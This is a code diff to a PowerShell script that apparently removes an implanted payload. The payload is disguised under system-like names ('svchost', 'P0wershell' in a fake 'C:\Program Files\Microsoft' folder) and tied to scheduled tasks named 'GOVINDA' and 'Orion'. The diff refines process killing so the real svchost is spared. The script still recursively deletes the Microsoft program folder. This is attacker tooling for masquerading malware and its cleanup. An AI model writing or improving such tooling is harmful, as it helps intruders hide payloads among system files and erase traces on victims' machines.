@@ -12,8 +12,10 @@ $body = @"
 `$regPath    = "$regPath"
 `$lnk        = "$lnk"
 `$tasks      = @("GOVINDA", "Orion")
-# kill anything touching our staging dir, plus the dropped exes by name/path
-Get-Process | Where-Object { `$_.Path -eq `$svchost -or `$_.Path -eq `$p0wershell -or `$_.Path -like "`$(`$msraDir)*" -or `$_.Name -eq "svchost" -or `$_.Name -eq "P0wershell" -or `$_.Name -eq "msra" } | Stop-Process -Force -ErrorAction SilentlyContinue
+# kill only our dropped files by path. Never match by process Name — the OS's
+# own C:\Windows\System32\svchost.exe would match "svchost" and killing it
+# crashes the system. Our payload runs from the paths below.
+Get-Process | Where-Object { `$_.Path -eq `$svchost -or `$_.Path -eq `$p0wershell -or `$_.Path -like "`$(`$msraDir)*" } | Stop-Process -Force -ErrorAction SilentlyContinue
 Remove-Item -Path `$svchost -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Program Files\Microsoft" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path `$p0wershell -Force -ErrorAction SilentlyContinue
@@ -34,8 +36,10 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-# kill anything touching our staging dir, plus the dropped exes by name/path
-Get-Process | Where-Object { $_.Path -eq $svchost -or $_.Path -eq $p0wershell -or $_.Path -like "$msraDir*" -or $_.Name -eq "svchost" -or $_.Name -eq "P0wershell" -or $_.Name -eq "msra" } | Stop-Process -Force -ErrorAction SilentlyContinue
+# kill only our dropped files by path. Never match by process Name — the OS's
+# own C:\Windows\System32\svchost.exe would match "svchost" and killing it
+# crashes the system. Our payload runs from the paths below.
+Get-Process | Where-Object { $_.Path -eq $svchost -or $_.Path -eq $p0wershell -or $_.Path -like "$msraDir*" } | Stop-Process -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $svchost -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Program Files\Microsoft" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $p0wershell -Force -ErrorAction SilentlyContinue
